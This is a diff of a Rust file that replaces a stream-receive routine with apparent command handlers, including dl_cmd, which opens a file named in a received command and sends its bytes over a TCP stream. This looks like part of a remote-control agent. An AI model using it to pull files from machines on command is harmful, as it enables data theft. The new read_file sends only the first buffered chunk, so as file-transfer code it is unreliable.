@@ -1,32 +1,35 @@
-use std::error::Error;
-use std::io::Read;
+use std::fs::File;
+use std::io::{BufRead, BufReader, Write};
 use std::net::TcpStream;
 
-pub fn receive_and_write_bytes(
-    tls_stream: &mut native_tls::TlsStream<TcpStream>,
-    bytes_vec: &mut Vec<u8>,
-    file_buffer: &mut [u8; 4096],
-) -> Result<(), Box<dyn Error>> {
-    loop {
-        if String::from_utf8_lossy(file_buffer).starts_with("EndOfTheFile") {
-            // Drop all the ending null bytes added by the buffer
-            let file_len_string = String::from_utf8_lossy(file_buffer)
-                .split_once(':')
-                .map(|x| x.1)
-                .unwrap_or("0")
-                .trim_end_matches('\0')
-                .to_owned();
-            let file_len_usize = file_len_string.parse::<usize>();
-            unsafe {
-                bytes_vec.set_len(file_len_usize.unwrap());
+pub enum HandlerStatus {
+    Ok,
+    FileError,
+    CmdError,
+    EndSession,
+    SendError,
+}
+
+pub fn dl_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
+    let path: Vec<&str> = cmd.split(' ').collect();
+    match File::open(path[1]) {
+        Ok(mut file) => match read_file(&mut file) {
+            Ok(vec) => {
+                let status = tls_stream.write_all(&vec);
+                if status.is_err() {
+                    return HandlerStatus::SendError;
+                }
+                HandlerStatus::Ok
             }
-            break;
-        }
-        bytes_vec.extend_from_slice(file_buffer);
-        for elem in file_buffer.iter_mut() {
-            *elem = 0;
-        }
-        tls_stream.read(file_buffer)?;
+            Err(_) => HandlerStatus::FileError,
+        },
+        Err(_) => HandlerStatus::FileError,
     }
-    Ok(())
+}
+
+pub fn read_file(file: &mut File) -> Result<Vec<u8>, std::io::Error> {
+    let mut reader = BufReader::new(file);
+    let vec = reader.fill_buf()?.to_vec();
+    reader.consume(vec.len());
+    Ok(vec)
 }
